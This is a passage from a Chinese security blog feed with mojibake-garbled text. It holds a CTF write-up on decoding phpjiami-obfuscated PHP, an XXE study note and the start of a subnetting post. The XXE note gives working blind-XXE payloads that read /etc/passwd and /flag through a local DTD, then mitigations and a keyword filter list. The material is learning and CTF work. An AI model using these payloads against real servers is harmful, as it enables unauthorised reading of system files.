class="string">'-46'</span>;</span><br><span class="line">            <span class="comment">// $v12 = $_v14(@$_v10(func4(substr($v7, $v11, $v12))));</span></span><br><span class="line">            $v12 = str_rot13(@gzuncompress(func4(substr($v7, $v11, $v12))));</span><br><span class="line">            <span class="keyword">return</span> $v12;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬å››ä¸ªå‡½æ•°æœ‰ç‚¹å¤æ‚ï¼Œè¿™æ˜¯ä¸€ä¸ªè§£ç å‡½æ•°ï¼Œç”¨çš„æ˜¯å¼‚æˆ–ç®—æ³•è§£å¯†ï¼Œæ‰€æœ‰è°ƒç”¨ func4 çš„ä½ç½®éƒ½æ²¡æœ‰æä¾› $arg2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func4</span><span class="params">($arg1, $arg2 = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $v1 = <span class="string">'base64_decode'</span>;</span><br><span class="line">            <span class="comment">// $v2 - $v4 é€šè¿‡ base64_decode è§£ç å¾—åˆ°</span></span><br><span class="line">            $v2 = <span class="string">'ord'</span>;</span><br><span class="line">            $v3 = <span class="string">'strlen'</span>;</span><br><span class="line">            $v4 = <span class="string">'chr'</span>;</span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? $v2('?') : $arg2;</span></span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? 136 : $arg2;</span></span><br><span class="line">            $arg2 = <span class="number">136</span>;</span><br><span class="line">            <span class="comment">// è¿™é‡Œ $v5 ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ $v6 = null;</span></span><br><span class="line">            $v6 = $v5;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($arg1); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; $v6 &lt; strlen($arg1); $v6++) &#123;</span><br><span class="line">                <span class="comment">// $v7 .= $v2($arg1[$v6]) &lt; $v2('?') ? $v2($arg1[$v6]) &gt; $arg2 &amp;&amp; $v2($arg1[$v6]) &lt; 245 ? $v4($v2($arg1[$v6]) / 2) : $arg1[$v6] : '';</span></span><br><span class="line">                $v7 .= ord($arg1[$v6]) &lt; <span class="number">245</span> ? ord($arg1[$v6]) &gt; $arg2 &amp;&amp; ord($arg1[$v6]) &lt; <span class="number">245</span> ? chr(ord($arg1[$v6]) / <span class="number">2</span>) : $arg1[$v6] : <span class="string">''</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// $v8 = $v1($v7);</span></span><br><span class="line">            $v8 = base64_decode($v7);</span><br><span class="line">            $v9 = <span class="string">'md5'</span>; <span class="comment">// $v9 é€šè¿‡ base64_decode è§£ç å¾—åˆ°</span></span><br><span class="line">            $v6 = $v5;</span><br><span class="line">            <span class="comment">// $arg2 = $v9('8_Q.L2');</span></span><br><span class="line">            <span class="comment">// $arg2 = md5('8_Q.L2');</span></span><br><span class="line">            $arg2 = <span class="string">'fac02565267d815643cecee75a16c7bd'</span>;</span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = $v3($arg2);</span></span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = strlen($arg2);</span></span><br><span class="line">            $v10 = $ctrmax = <span class="number">32</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($v8); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; $v6 &lt; strlen($v8); $v6++) &#123;</span><br><span class="line">                $v10 = $v10 ? $v10 : $ctrmax;</span><br><span class="line">                $v10--;</span><br><span class="line">                $v11 .= $v8[$v6] ^ $arg2[$v10];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $v11;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $_v1, <span class="comment">// $_v1 = 'file_get_contents';</span></span><br><span class="line">$_v2, <span class="comment">// $_v2 = 'chr';</span></span><br><span class="line">$_v3, <span class="comment">// $_v3 = 'substr';</span></span><br><span class="line">$_v4, <span class="comment">// $_v4 = 'assert';</span></span><br><span class="line">$_v5, <span class="comment">// $_v5 = 'assert_options';</span></span><br><span class="line">$_v6, <span class="comment">// $_v6 = 'unpack';</span></span><br><span class="line">$_v7, <span class="comment">// $_v7 = 'constant';</span></span><br><span class="line">$_v8, <span class="comment">// $_v8 = 'preg_replace';</span></span><br><span class="line">$_v9, <span class="comment">// $_v9 = 'base64_encode';</span></span><br><span class="line">$_v10, <span class="comment">// $_v10 = 'gzuncompress';</span></span><br><span class="line">$_v11, <span class="comment">// $_v11 = 'create_function';</span></span><br><span class="line">$_v12, <span class="comment">// $_v12 = 'strpos';</span></span><br><span class="line">$_v13, <span class="comment">// $_v13 = 'addslashes';</span></span><br><span class="line">$_v14, <span class="comment">// $_v14 = 'str_rot13';</span></span><br><span class="line">$_v15, <span class="comment">// $_v15 = 'md5';</span></span><br><span class="line">$_v16, <span class="comment">// $_v16 = 'set_include_path';</span></span><br><span class="line">$_v17; <span class="comment">// $_v17 = 'dirname';</span></span><br><span class="line"><span class="comment">// ç„¶åä¸€å †å˜é‡ç­‰äº func2</span></span><br><span class="line"><span class="keyword">if</span> (!$_v1) &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ func2 ç”¨ä¼ é€’å¼•ç”¨å˜é‡çš„æ–¹æ³•èµ‹å€¼ï¼Œç®€åŒ–ä¹‹åå¦‚ä¸‹</span></span><br><span class="line">    $_v1 = <span class="string">'file_get_contents'</span>;</span><br><span class="line">    $_v3 = <span class="string">'substr'</span>;</span><br><span class="line">    $_v6 = <span class="string">'unpack'</span>;</span><br><span class="line">    $_v10 = <span class="string">'gzuncompress'</span>;</span><br><span class="line">    $_v11 = <span class="string">'create_function'</span>;</span><br><span class="line">    $_v12 = <span class="string">'strpos'</span>;</span><br><span class="line">    $_v13 = <span class="string">'addslashes'</span>;</span><br><span class="line">    $_v14 = <span class="string">'str_rot13'</span>;</span><br><span class="line">    $_v15 = <span class="string">'md5'</span>;</span><br><span class="line">    $_v16 = <span class="string">'set_include_path'</span>;</span><br><span class="line">    $_v17 = <span class="string">'dirname'</span>;</span><br><span class="line">    $_v8 = <span class="string">'preg_replace'</span>;</span><br><span class="line">    $_v9 = <span class="string">'base64_encode'</span>;</span><br><span class="line">    $_v7 = <span class="string">'constant'</span>;</span><br><span class="line">    $_v5 = <span class="string">'assert_options'</span>;</span><br><span class="line">    $_v4 = <span class="string">'assert'</span>;</span><br><span class="line">    $_v2 = <span class="string">'chr'</span>;</span><br><span class="line">    $v1 = <span class="string">'rand'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä¸€å †å˜é‡ç­‰äº func4ï¼Œç„¶åç”¨ func4 è§£ç </span></span><br><span class="line">$v2 = <span class="string">'_f_'</span>;</span><br><span class="line">$v3 = func3($&#123;$v2&#125;);</span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line">set_include_path(dirname($&#123;$v2&#125;));</span><br><span class="line"><span class="comment">// $v4 = $_v9($v3);</span></span><br><span class="line">$v4 = base64_encode($v3);</span><br><span class="line"><span class="comment">// $v5 = func4('??????');</span></span><br><span class="line"><span class="comment">// è§£å¯†ä¹‹åçš„åŸæ–‡ä¸æ˜¯ $v4ï¼Œè¿™é‡Œæ˜¯ç¿»è¯‘ä¹‹åçš„</span></span><br><span class="line">$v5 = <span class="string">'eval(base64_decode($v4));'</span>;</span><br><span class="line"><span class="comment">// $v5 = $_v8(func4('??????'), $v5, func4('??????'));</span></span><br><span class="line"><span class="comment">// mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span></span><br><span class="line"><span class="comment">// PCRE ä¿®é¥°ç¬¦ e (PREG_REPLACE_EVAL)</span></span><br><span class="line"><span class="comment">// Warning: This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.</span></span><br><span class="line"><span class="comment">// If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.</span></span><br><span class="line"><span class="comment">// æ¢å¥è¯è¯´ preg_replace å¦‚æœå¸¦ e çš„è¯ï¼Œç¬¬ä¸€æ­¥ï¼Œæ­£å¸¸åœ°è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢ï¼ˆåå‘å¼•ç”¨ä¹Ÿä¼šè¢«æ­£å¸¸æ›¿æ¢ï¼Œå°±æ˜¯å®Œå…¨æ­£å¸¸çš„æ­£åˆ™æ›¿æ¢ï¼‰ï¼Œç¬¬äºŒæ­¥ï¼ŒæŠŠç»“æœ eval ä½œä¸ºæœ€ç»ˆç»“æœ</span></span><br><span class="line"><span class="comment">// ç®€è€Œè¨€ä¹‹ $v5 = eval($v5);</span></span><br><span class="line">$v5 = preg_replace(<span class="string">'/0dcaf9/e'</span>, $v5, <span class="string">'0dcaf9'</span>);</span><br><span class="line"><span class="comment">// æŠŠä¸Šè¿°å‡ æ­¥ç»Ÿä¸€ä¸€ä¸‹ $v5 = eval(func3($_f_));</span></span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line">set_include_path(dirname($&#123;$v2&#125;));</span><br><span class="line"><span class="comment">// æŠŠè§£ç ä¹‹åçš„æ–‡ä»¶è¿è¡Œç»“æœè¿”å›</span></span><br><span class="line"><span class="keyword">return</span> $v5;</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç "><a href="#è§£ç " class="headerlink" title="è§£ç "></a>è§£ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data_1 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        <span class="keyword">if</span> ($ch &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ch &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                $data_1 .= chr($ch / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = <span class="number">32</span>;</span><br><span class="line">    $data_2 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($j &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $code_end = strrpos($code, <span class="string">'?&gt;'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$code_end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + <span class="number">2</span>;</span><br><span class="line">    $data = substr($code, $data_start, <span class="number">-46</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2('bWQ1');</span></span><br><span class="line">    <span class="comment">// $key1 = $v1('??????');</span></span><br><span class="line">    $pos1 = strpos($code, <span class="string">"('"</span> . preg_quote(base64_encode(<span class="string">'md5'</span>)) . <span class="string">"');"</span>);</span><br><span class="line">    $pos2 = strrpos(substr($code, <span class="number">0</span>, $pos1), <span class="string">'$'</span>);</span><br><span class="line">    $pos3 = strrpos(substr($code, <span class="number">0</span>, $pos2), <span class="string">'$'</span>);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - <span class="number">1</span>);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, <span class="string">"('"</span>, $pos4);</span><br><span class="line">    $pos6 = strpos($code, <span class="string">"')"</span>, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + <span class="number">2</span>, $pos6 - $pos5 - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[<span class="number">1</span>];</span><br><span class="line">$output_file = $argv[<span class="number">1</span>] . <span class="string">'.decrypted.php'</span>;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line"><span class="keyword">if</span> (!$code) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'æœªæ‰¾åˆ°åŠ å¯†æ•°æ®'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line"><span class="keyword">if</span> (!$key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'æœªæ‰¾åˆ°ç§˜é’¥'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line"><span class="comment">// ç”±äºå¯ä»¥ä¸å‹¾é€‰ä»£ç å‹ç¼©çš„é€‰é¡¹ï¼Œæ‰€ä»¥è¿™é‡Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦è§£å‹æˆåŠŸï¼Œè§£å‹å¤±è´¥å°±æ˜¯æ²¡å‹ç¼©</span></span><br><span class="line"><span class="keyword">if</span> ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'è§£å¯†åæ–‡ä»¶å·²å†™å…¥åˆ° '</span>, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure></div>

<h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œ<code>index.php</code> æç¤ºå­˜åœ¨ <code>UploadFile.class.php</code>ï¼Œä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå‘ç°å…³é”®å‡½æ•°ï¼Œç„¶åæ•°ç»„ç»•è¿‡å°±vansäº†</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"> <span class="comment">// ç”¨.åˆ†å‰²æ–‡ä»¶åï¼Œåªä¿ç•™é¦–å°¾ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²å¾¡Apacheè§£ææ¼æ´</span></span><br><span class="line">    $origin_name = current($filename);</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    $new_name = (<span class="keyword">$this</span>-&gt;new_name ? <span class="keyword">$this</span>-&gt;new_name : $origin_name) . <span class="string">'.'</span> . $ext;</span><br><span class="line">    $target_fullpath = <span class="keyword">$this</span>-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure></div>

<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html" target="_blank" rel="noopener">Virinkå¸ˆå‚…çš„é¢˜è§£</a><br><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">pç¥çš„å‡ºé¢˜åŸç†</a><br><a href="http://lovei.org/archives/pwnhub6669.html" target="_blank" rel="noopener">è…¹é»‘å¸ˆå‚…çš„wp</a><br><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">Ganlv å¸ˆå‚…çš„è§£ç æ€è·¯</a><br><a href="https://www.colabug.com/2018/0209/2334241/" target="_blank" rel="noopener">æŸPHPåŠ å¯†æ–‡ä»¶è§£å¯†è¿‡ç¨‹åˆæ¢</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEæ¼æ´å­¦ä¹ </title>
    <url>/yakko117/2020/03/18/XXElearn/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æœ€è¿‘è«åå¼€å§‹å€’æ—¶å·®ï¼Œæ¯å¤©ä¸‹åˆ5ç‚¹å¤šå¼€å§‹çŠ¯å›°ï¼Œç„¶åä¸€ç¡å°±ç¡åˆ°äº†åŠå¤œèµ·æ¥<br>åªä¼šåšé¢˜æ˜¯ä¸è¡Œçš„ï¼Œè¦å»å­¦ä¹ åŸç†ï¼Œè€Œä¸æ˜¯çº¯ç²¹åšä¸ªè„šæœ¬å°å­</p>
<a id="more"></a>

<h1 id="åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£"><a href="#åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£" class="headerlink" title="åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£"></a>åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£</h1><p><a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">XMLç±»å‹å£°æ˜åŸæ–‡æ¡£</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html" target="_blank" rel="noopener">XXEæ¼æ´å­¦ä¹ </a><br><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXEæ¼æ´åˆ©ç”¨æŠ€å·§ï¼šä»XMLåˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ</a><br><a href="https://zhuanlan.zhihu.com/p/88125925" target="_blank" rel="noopener">googleCTF2019å…³äºxxeçš„é¢˜è§£</a><br><a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="noopener">ç›²æ³¨æŠ€å·§</a><br><a href="https://xz.aliyun.com/t/6829" target="_blank" rel="noopener">PHPä¸JAVAä¹‹XXEæ¼æ´è¯¦è§£ä¸å®¡è®¡</a></p>
<h1 id="å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹"><a href="#å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹" class="headerlink" title="å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹"></a>å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹</h1><p>ç°åœ¨æœ‰<code>å›æ˜¾çš„XXE</code> å·²ç»å¾ˆå°‘äº†,Blind-XXEé‡ç‚¹åœ¨äºå¦‚ä½•å°†æ•°æ®ä¼ è¾“å‡ºæ¥ã€‚</p>
<p>ä»¥å¾€å¾ˆå¤šæ–‡ç« é€šè¿‡å¼•å…¥å¤–éƒ¨æœåŠ¡å™¨æˆ–å¤–éƒ¨dtdæ–‡ä»¶,å¯ä»¥å®ç° <code>OOB(out-of-band)</code> ä¿¡æ¯ä¼ é€’å’Œé€šè¿‡æ„é€ dtdä»é”™è¯¯ä¿¡æ¯è·å–æ•°æ®ã€‚</p>
<h2 id="è®°å¾—æ”¹"><a href="#è®°å¾—æ”¹" class="headerlink" title="è®°å¾—æ”¹"></a>è®°å¾—æ”¹</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-type</span>: application/xml</span><br></pre></td></tr></table></figure></div>

<h2 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" data-fancybox="group" data-caption="pro" class="fancybox"><img alt="pro" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" class="lazyload" title="pro"></a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>å¦‚æœç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™ååˆ†ä¸¥æ ¼,ä¸å…è®¸æˆ‘ä»¬è¯·æ±‚å¤–ç½‘æœåŠ¡å™¨dtd,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥æœ¬åœ°dtdæ–‡ä»¶å®ç°XXEã€‚</p>
<p><font color="6495ED">ubuntuç³»ç»Ÿ</font>è‡ªå¸¦ <code>/usr/share/yelp/dtd/docbookx.dtd</code> æ–‡ä»¶</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">para</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;id;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><a href="#ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•" class="headerlink" title="ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"></a>ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></div>


<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div>

<h2 id="è¿‡æ»¤å…³é”®è¯ï¼š"><a href="#è¿‡æ»¤å…³é”®è¯ï¼š" class="headerlink" title="è¿‡æ»¤å…³é”®è¯ï¼š"></a>è¿‡æ»¤å…³é”®è¯ï¼š</h2><ul>
<li><code>&lt;!DOCTYPE</code> </li>
<li><code>&lt;!ENTITY</code></li>
<li><code>SYSTEM</code></li>
<li><code>PUBLIC</code></li>
</ul>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>å­ç½‘åˆ’åˆ†å’Œå­ç½‘æ©ç è®¡ç®—æ–¹æ³•</title>
    <url>/yakko117/2020/03/06/ip%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å­ç½‘åˆ’åˆ†"><a href="#å­ç½‘åˆ’åˆ†" class="headerlink" title="å­ç½‘åˆ’åˆ†"></a>å­ç½‘åˆ’åˆ†</h1><p><code>å­ç½‘åˆ’åˆ†</code> æ˜¯é€šè¿‡å€Ÿç”¨IPåœ°å€ä¸­è‹¥å¹²ä½ä¸»æœºåœ°å€æ¥å……å½“å­ç½‘çš„ç½‘ç»œåœ°å€ï¼Œä»è€Œå°†åŸç½‘ç»œåˆ’åˆ†ä¸ºè‹¥å¹²å­ç½‘ã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘"><a href="#ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘" class="headerlink" title="ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘"></a>ä¸ºä»€ä¹ˆåˆ’åˆ†å­ç½‘</h2><ul>
<li>IPåœ°å€ç©ºé—´çš„åˆ©ç”¨ç‡æœ‰æ—¶å€™ä¸é«˜</li>
</ul>
